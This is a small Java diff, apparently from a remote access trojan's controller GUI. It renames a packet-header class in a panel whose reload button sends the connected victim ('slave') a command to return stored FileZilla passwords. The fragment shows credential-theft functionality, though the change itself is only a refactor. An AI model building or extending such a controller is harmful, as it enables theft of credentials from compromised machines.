@@ -15,7 +15,7 @@ import javax.swing.ScrollPaneConstants;
 import javax.swing.table.DefaultTableModel;
 
 import com.redpois0n.Slave;
-import com.redpois0n.packets.outgoing.Header;
+import com.redpois0n.packets.OutgoingHeader;
 
 @SuppressWarnings("serial")
 public class PanelControlFileZilla extends PanelControlParent {
@@ -38,7 +38,7 @@ public class PanelControlFileZilla extends PanelControlParent {
 		btnReload.addActionListener(new ActionListener() {
 			public void actionPerformed(ActionEvent arg0) {
 				clear();
-				slave.addToSendQueue(Header.PASSWORD_FILEZILLA);
+				slave.addToSendQueue(OutgoingHeader.PASSWORD_FILEZILLA);
 			}
 		});
 
